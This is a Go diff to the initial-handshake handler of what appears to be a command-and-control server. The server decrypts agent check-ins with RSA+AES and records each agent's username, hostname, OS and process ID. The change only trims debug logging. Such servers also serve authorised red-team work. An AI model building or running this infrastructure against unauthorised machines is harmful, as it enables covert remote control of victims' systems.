@@ -24,12 +24,8 @@ import (
 
 // handleInitialHandshake processes the first POST from a new client
 func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request, initData *InitData) error {
-	log.Printf("[Handshake] Starting initial handshake for client: %s", initData.ClientID)
-	log.Printf("[Handshake] RSAKey length: %d", len(initData.RSAKey))
-
 	// Get external IP
 	externalIP := getRemoteIP(r)
-	log.Printf("[Handshake] Client connecting from external IP: %s", externalIP)
 
 	// Read and decode the request body
 	var postData PostData
@@ -39,26 +35,19 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 		return fmt.Errorf("failed to read request body: %v", err)
 	}
 
-	log.Printf("[DEBUG] Received raw request body: %s", string(body))
-
 	if err := json.Unmarshal(body, &postData); err != nil {
 		log.Printf("[ERROR] Failed to decode request body: %v", err)
 		return fmt.Errorf("failed to decode request body: %v", err)
 	}
 
-	// Print metadata to verify encryption type
-	log.Printf("[DEBUG] Request metadata: %+v", postData.Metadata)
-
 	var decrypted string
 	if encType, ok := postData.Metadata["encryption"]; ok && encType == "rsa+aes" {
-		log.Printf("[DEBUG] Using RSA+AES decryption")
 		decrypted, err = DecryptDoubleEncrypted(postData.Data, initData.RSAKey, initData.Secret)
 		if err != nil {
 			log.Printf("[ERROR] Double decryption failed: %v", err)
 			return fmt.Errorf("failed to decrypt double-encrypted data: %v", err)
 		}
 	} else {
-		log.Printf("[DEBUG] Using legacy AES-only decryption")
 		decrypted, err = DecryptJSON(postData.Data, initData.Secret)
 		if err != nil {
 			log.Printf("[ERROR] Legacy decryption failed: %v", err)
@@ -170,8 +159,10 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 		return fmt.Errorf("failed to commit transaction: %v", err)
 	}
 
-	log.Printf("[Handshake] Created new connection with newclientID: %s for clientID: %s",
-		newGUID, initData.ClientID)
+	// Log clean agent connection message
+	log.Printf("[AGENT] %s connected from %s (%s@%s, %s, pid=%d)",
+		newGUID, externalIP, sysInfo.AgentInfo.Username, sysInfo.AgentInfo.Hostname,
+		sysInfo.AgentInfo.OS, sysInfo.AgentInfo.PID)
 
 	// Add to active connections in memory
 	newConn := &ActiveConnection{
